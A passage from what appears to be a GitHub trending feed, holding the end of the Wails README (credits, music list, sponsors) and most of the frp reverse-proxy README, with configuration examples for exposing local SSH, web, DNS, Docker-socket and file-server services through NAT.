href=&#34;https://github.com/zserge/webview&#34;&gt;Webview&lt;/a&gt; which Wails uses for the windowing.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/bh90210&#34;&gt;Byron&lt;/a&gt; - At times, Byron has single handedly kept this project alive. Without his incredible input, we never would have got to v1.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;This project was mainly coded to the following albums:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://open.spotify.com/album/1R2rsEUqXjIvAbzM0yHrxA&#34;&gt;Manic Street Preachers - Resistance Is Futile&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://open.spotify.com/album/4VzCL9kjhgGQeKCiojK1YN&#34;&gt;Manic Street Preachers - This Is My Truth, Tell Me Yours&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://open.spotify.com/album/4Krg8zvprquh7TVn9OxZn8&#34;&gt;The Midnight - Endless Summer&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://open.spotify.com/album/3kMfsD07Q32HRWKRrpcexr&#34;&gt;Gary Newman - Savage (Songs from a Broken World)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://open.spotify.com/album/0oL0OhrE2rYVns4IGj8h2m&#34;&gt;Steve Vai - Passion &amp;amp; Warfare&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://open.spotify.com/album/1nJsbWm3Yy2DW1KIc1OKle&#34;&gt;Ben Howard - Every Kingdom&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://open.spotify.com/album/6astw05cTiXEc2OvyByaPs&#34;&gt;Ben Howard - Noonday Dream&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://open.spotify.com/album/2vBE40Rp60tl7rNqIZjaXM&#34;&gt;Adwaith - Melyn&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://open.spotify.com/album/3v2hrfNGINPLuDP0YDTOjm&#34;&gt;Gwidaith Hen Fran - Cedors Hen Wrach&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://open.spotify.com/album/2Kh43m04B1UkVcpcRa1Zug&#34;&gt;Metallica - Metallica&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://open.spotify.com/album/6SsIdN05HQg2GwYLfXuzLB&#34;&gt;Bloc Party - Silent Alarm&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://open.spotify.com/album/3tklE2Fgw1hCIUstIwPBJF&#34;&gt;Maxthor - Another World&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://open.spotify.com/album/0c32OywcLpdJCWWMC6vB8v&#34;&gt;Alun Tan Lan - Y Distawrwydd&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;span id=&#34;nav-11&#34;&gt;&lt;/span&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Special Thanks&lt;/h2&gt; &#xA;&lt;p align=&#34;center&#34; style=&#34;text-align: center&#34;&gt; &lt;a href=&#34;https://pace.dev&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/assets/images/pace.jpeg&#34;&gt;&lt;/a&gt;&lt;br&gt; A &lt;i&gt;huge&lt;/i&gt; thanks to &lt;a href=&#34;https://pace.dev&#34;&gt;Pace&lt;/a&gt; for sponsoring the project and helping the efforts to get Wails ported to Apple Silicon!&lt;br&gt;&lt;br&gt; If you are looking for a Project Management tool that&#39;s powerful but quick and easy to use, check them out!&lt;br&gt;&lt;br&gt; &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34; style=&#34;text-align: center&#34;&gt; A special thank you to JetBrains for donating licenses to us!&lt;br&gt;&lt;br&gt; Please click the logo to let them know your appreciation!&lt;br&gt;&lt;br&gt; &lt;a href=&#34;https://www.jetbrains.com?from=Wails&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/wailsapp/wails/master/assets/images/jetbrains-grayscale.png&#34; width=&#34;30%&#34;&gt;&lt;/a&gt; &lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>fatedier/frp</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/fatedier/frp</id>
    <link href="https://github.com/fatedier/frp" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;frp&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://circleci.com/gh/fatedier/frp&#34;&gt;&lt;img src=&#34;https://circleci.com/gh/fatedier/frp.svg?style=shield&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/fatedier/frp/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/tag/fatedier/frp.svg?label=release&#34; alt=&#34;GitHub release&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/README.md&#34;&gt;README&lt;/a&gt; | &lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/README_zh.md&#34;&gt;中文文档&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3 align=&#34;center&#34;&gt;Platinum Sponsors&lt;/h3&gt; &#xA;&lt;!--platinum sponsors start--&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://www.doppler.com/?utm_campaign=github_repo&amp;amp;utm_medium=referral&amp;amp;utm_content=frp&amp;amp;utm_source=github&#34; target=&#34;_blank&#34;&gt; &lt;img width=&#34;400px&#34; src=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/doc/pic/sponsor_doppler.png&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;!--platinum sponsors end--&gt; &#xA;&lt;h3 align=&#34;center&#34;&gt;Gold Sponsors&lt;/h3&gt; &#xA;&lt;!--gold sponsors start--&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://workos.com/?utm_campaign=github_repo&amp;amp;utm_medium=referral&amp;amp;utm_content=frp&amp;amp;utm_source=github&#34; target=&#34;_blank&#34;&gt; &lt;img width=&#34;300px&#34; src=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/doc/pic/sponsor_workos.png&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;!--gold sponsors end--&gt; &#xA;&lt;h3 align=&#34;center&#34;&gt;Silver Sponsors&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Sakura Frp - 欢迎点击 &#34;加入我们&#34;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;What is frp?&lt;/h2&gt; &#xA;&lt;p&gt;frp is a fast reverse proxy to help you expose a local server behind a NAT or firewall to the Internet. As of now, it supports &lt;strong&gt;TCP&lt;/strong&gt; and &lt;strong&gt;UDP&lt;/strong&gt;, as well as &lt;strong&gt;HTTP&lt;/strong&gt; and &lt;strong&gt;HTTPS&lt;/strong&gt; protocols, where requests can be forwarded to internal services by domain name.&lt;/p&gt; &#xA;&lt;p&gt;frp also has a P2P connect mode.&lt;/p&gt; &#xA;&lt;h2&gt;Table of Contents&lt;/h2&gt; &#xA;&lt;!-- vim-markdown-toc GFM --&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#development-status&#34;&gt;Development Status&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#architecture&#34;&gt;Architecture&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#example-usage&#34;&gt;Example Usage&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#access-your-computer-in-lan-by-ssh&#34;&gt;Access your computer in LAN by SSH&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#visit-your-web-service-in-lan-by-custom-domains&#34;&gt;Visit your web service in LAN by custom domains&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#forward-dns-query-request&#34;&gt;Forward DNS query request&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#forward-unix-domain-socket&#34;&gt;Forward Unix domain socket&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#expose-a-simple-http-file-server&#34;&gt;Expose a simple HTTP file server&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#enable-https-for-local-https-service&#34;&gt;Enable HTTPS for local HTTP(S) service&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#expose-your-service-privately&#34;&gt;Expose your service privately&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#p2p-mode&#34;&gt;P2P Mode&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#features&#34;&gt;Features&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#configuration-files&#34;&gt;Configuration Files&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#using-environment-variables&#34;&gt;Using Environment Variables&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#split-configures-into-different-files&#34;&gt;Split Configures Into Different Files&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#dashboard&#34;&gt;Dashboard&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#admin-ui&#34;&gt;Admin UI&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#monitor&#34;&gt;Monitor&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#prometheus&#34;&gt;Prometheus&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#authenticating-the-client&#34;&gt;Authenticating the Client&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#token-authentication&#34;&gt;Token Authentication&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#oidc-authentication&#34;&gt;OIDC Authentication&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#encryption-and-compression&#34;&gt;Encryption and Compression&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#tls&#34;&gt;TLS&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#hot-reloading-frpc-configuration&#34;&gt;Hot-Reloading frpc configuration&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#get-proxy-status-from-client&#34;&gt;Get proxy status from client&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#only-allowing-certain-ports-on-the-server&#34;&gt;Only allowing certain ports on the server&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#port-reuse&#34;&gt;Port Reuse&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#bandwidth-limit&#34;&gt;Bandwidth Limit&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#for-each-proxy&#34;&gt;For Each Proxy&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#tcp-stream-multiplexing&#34;&gt;TCP Stream Multiplexing&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#support-kcp-protocol&#34;&gt;Support KCP Protocol&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#connection-pooling&#34;&gt;Connection Pooling&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#load-balancing&#34;&gt;Load balancing&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#service-health-check&#34;&gt;Service Health Check&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#rewriting-the-http-host-header&#34;&gt;Rewriting the HTTP Host Header&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#setting-other-http-headers&#34;&gt;Setting other HTTP Headers&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#get-real-ip&#34;&gt;Get Real IP&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#http-x-forwarded-for&#34;&gt;HTTP X-Forwarded-For&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#proxy-protocol&#34;&gt;Proxy Protocol&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#require-http-basic-auth-password-for-web-services&#34;&gt;Require HTTP Basic Auth (Password) for Web Services&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#custom-subdomain-names&#34;&gt;Custom Subdomain Names&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#url-routing&#34;&gt;URL Routing&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#tcp-port-multiplexing&#34;&gt;TCP Port Multiplexing&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#connecting-to-frps-via-http-proxy&#34;&gt;Connecting to frps via HTTP PROXY&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#range-ports-mapping&#34;&gt;Range ports mapping&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#client-plugins&#34;&gt;Client Plugins&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#server-manage-plugins&#34;&gt;Server Manage Plugins&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#development-plan&#34;&gt;Development Plan&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#contributing&#34;&gt;Contributing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#donation&#34;&gt;Donation&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#github-sponsors&#34;&gt;GitHub Sponsors&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#paypal&#34;&gt;PayPal&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;!-- vim-markdown-toc --&gt; &#xA;&lt;h2&gt;Development Status&lt;/h2&gt; &#xA;&lt;p&gt;frp is under development. Try the latest release version in the &lt;code&gt;master&lt;/code&gt; branch, or use the &lt;code&gt;dev&lt;/code&gt; branch for the version in development.&lt;/p&gt; &#xA;&lt;p&gt;We are working on v2 version and trying to do some code refactor and improvements. It won&#39;t be compatible with v1.&lt;/p&gt; &#xA;&lt;p&gt;We will switch v0 to v1 at the right time and only accept bug fixes and improvements instead of big feature requirements.&lt;/p&gt; &#xA;&lt;h2&gt;Architecture&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/doc/pic/architecture.png&#34; alt=&#34;architecture&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Example Usage&lt;/h2&gt; &#xA;&lt;p&gt;Firstly, download the latest programs from &lt;a href=&#34;https://github.com/fatedier/frp/releases&#34;&gt;Release&lt;/a&gt; page according to your operating system and architecture.&lt;/p&gt; &#xA;&lt;p&gt;Put &lt;code&gt;frps&lt;/code&gt; and &lt;code&gt;frps.ini&lt;/code&gt; onto your server A with public IP.&lt;/p&gt; &#xA;&lt;p&gt;Put &lt;code&gt;frpc&lt;/code&gt; and &lt;code&gt;frpc.ini&lt;/code&gt; onto your server B in LAN (that can&#39;t be connected from public Internet).&lt;/p&gt; &#xA;&lt;h3&gt;Access your computer in LAN by SSH&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Modify &lt;code&gt;frps.ini&lt;/code&gt; on server A and set the &lt;code&gt;bind_port&lt;/code&gt; to be connected to frp clients:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frps.ini&#xA;[common]&#xA;bind_port = 7000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;Start &lt;code&gt;frps&lt;/code&gt; on server A:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;code&gt;./frps -c ./frps.ini&lt;/code&gt;&lt;/p&gt; &#xA;&lt;ol start=&#34;3&#34;&gt; &#xA; &lt;li&gt;On server B, modify &lt;code&gt;frpc.ini&lt;/code&gt; to put in your &lt;code&gt;frps&lt;/code&gt; server public IP as &lt;code&gt;server_addr&lt;/code&gt; field:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[common]&#xA;server_addr = x.x.x.x&#xA;server_port = 7000&#xA;&#xA;[ssh]&#xA;type = tcp&#xA;local_ip = 127.0.0.1&#xA;local_port = 22&#xA;remote_port = 6000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note that &lt;code&gt;local_port&lt;/code&gt; (listened on client) and &lt;code&gt;remote_port&lt;/code&gt; (exposed on server) are for traffic goes in/out the frp system, whereas &lt;code&gt;server_port&lt;/code&gt; is used between frps.&lt;/p&gt; &#xA;&lt;ol start=&#34;4&#34;&gt; &#xA; &lt;li&gt;Start &lt;code&gt;frpc&lt;/code&gt; on server B:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;code&gt;./frpc -c ./frpc.ini&lt;/code&gt;&lt;/p&gt; &#xA;&lt;ol start=&#34;5&#34;&gt; &#xA; &lt;li&gt;From another machine, SSH to server B like this (assuming that username is &lt;code&gt;test&lt;/code&gt;):&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;code&gt;ssh -oPort=6000 test@x.x.x.x&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Visit your web service in LAN by custom domains&lt;/h3&gt; &#xA;&lt;p&gt;Sometimes we want to expose a local web service behind a NAT network to others for testing with your own domain name and unfortunately we can&#39;t resolve a domain name to a local IP.&lt;/p&gt; &#xA;&lt;p&gt;However, we can expose an HTTP(S) service using frp.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Modify &lt;code&gt;frps.ini&lt;/code&gt;, set the vhost HTTP port to 8080:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frps.ini&#xA;[common]&#xA;bind_port = 7000&#xA;vhost_http_port = 8080&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;Start &lt;code&gt;frps&lt;/code&gt;:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;code&gt;./frps -c ./frps.ini&lt;/code&gt;&lt;/p&gt; &#xA;&lt;ol start=&#34;3&#34;&gt; &#xA; &lt;li&gt;Modify &lt;code&gt;frpc.ini&lt;/code&gt; and set &lt;code&gt;server_addr&lt;/code&gt; to the IP address of the remote frps server. The &lt;code&gt;local_port&lt;/code&gt; is the port of your web service:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[common]&#xA;server_addr = x.x.x.x&#xA;server_port = 7000&#xA;&#xA;[web]&#xA;type = http&#xA;local_port = 80&#xA;custom_domains = www.example.com&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;4&#34;&gt; &#xA; &lt;li&gt;Start &lt;code&gt;frpc&lt;/code&gt;:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;code&gt;./frpc -c ./frpc.ini&lt;/code&gt;&lt;/p&gt; &#xA;&lt;ol start=&#34;5&#34;&gt; &#xA; &lt;li&gt; &lt;p&gt;Resolve A record of &lt;code&gt;www.example.com&lt;/code&gt; to the public IP of the remote frps server or CNAME record to your origin domain.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Now visit your local web service using url &lt;code&gt;http://www.example.com:8080&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Forward DNS query request&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Modify &lt;code&gt;frps.ini&lt;/code&gt;:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frps.ini&#xA;[common]&#xA;bind_port = 7000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;Start &lt;code&gt;frps&lt;/code&gt;:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;code&gt;./frps -c ./frps.ini&lt;/code&gt;&lt;/p&gt; &#xA;&lt;ol start=&#34;3&#34;&gt; &#xA; &lt;li&gt;Modify &lt;code&gt;frpc.ini&lt;/code&gt; and set &lt;code&gt;server_addr&lt;/code&gt; to the IP address of the remote frps server, forward DNS query request to Google Public DNS server &lt;code&gt;8.8.8.8:53&lt;/code&gt;:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[common]&#xA;server_addr = x.x.x.x&#xA;server_port = 7000&#xA;&#xA;[dns]&#xA;type = udp&#xA;local_ip = 8.8.8.8&#xA;local_port = 53&#xA;remote_port = 6000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;4&#34;&gt; &#xA; &lt;li&gt;Start frpc:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;code&gt;./frpc -c ./frpc.ini&lt;/code&gt;&lt;/p&gt; &#xA;&lt;ol start=&#34;5&#34;&gt; &#xA; &lt;li&gt;Test DNS resolution using &lt;code&gt;dig&lt;/code&gt; command:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;code&gt;dig @x.x.x.x -p 6000 www.google.com&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Forward Unix domain socket&lt;/h3&gt; &#xA;&lt;p&gt;Expose a Unix domain socket (e.g. the Docker daemon socket) as TCP.&lt;/p&gt; &#xA;&lt;p&gt;Configure &lt;code&gt;frps&lt;/code&gt; same as above.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Start &lt;code&gt;frpc&lt;/code&gt; with configuration:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[common]&#xA;server_addr = x.x.x.x&#xA;server_port = 7000&#xA;&#xA;[unix_domain_socket]&#xA;type = tcp&#xA;remote_port = 6000&#xA;plugin = unix_domain_socket&#xA;plugin_unix_path = /var/run/docker.sock&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;Test: Get Docker version using &lt;code&gt;curl&lt;/code&gt;:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;code&gt;curl http://x.x.x.x:6000/version&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Expose a simple HTTP file server&lt;/h3&gt; &#xA;&lt;p&gt;Browser your files stored in the LAN, from public Internet.&lt;/p&gt; &#xA;&lt;p&gt;Configure &lt;code&gt;frps&lt;/code&gt; same as above.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Start &lt;code&gt;frpc&lt;/code&gt; with configuration:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[common]&#xA;server_addr = x.x.x.x&#xA;server_port = 7000&#xA;&#xA;[test_static_file]&#xA;type = tcp&#xA;remote_port = 6000&#xA;plugin = static_file&#xA;plugin_local_path = /tmp/files&#xA;plugin_strip_prefix = static&#xA;plugin_http_user = abc&#xA;plugin_http_passwd = abc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;Visit &lt;code&gt;http://x.x.x.x:6000/static/&lt;/code&gt; from your browser and specify correct user and password to view files in &lt;code&gt;/tmp/files&lt;/code&gt; on the &lt;code&gt;frpc&lt;/code&gt; machine.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Enable HTTPS for local HTTP(S) service&lt;/h3&gt; &#xA;&lt;p&gt;You may substitute &lt;code&gt;https2https&lt;/code&gt; for the plugin, and point the &lt;code&gt;plugin_local_addr&lt;/code&gt; to a HTTPS endpoint.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Start &lt;code&gt;frpc&lt;/code&gt; with configuration:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[common]&#xA;server_addr = x.x.x.x&#xA;server_port = 7000&#xA;&#xA;[test_https2http]&#xA;type = https&#xA;custom_domains = test.example.com&#xA;&#xA;plugin = https2http&#xA;plugin_local_addr = 127.0.0.1:80&#xA;plugin_crt_path = ./server.crt&#xA;plugin_key_path = ./server.key&#xA;plugin_host_header_rewrite = 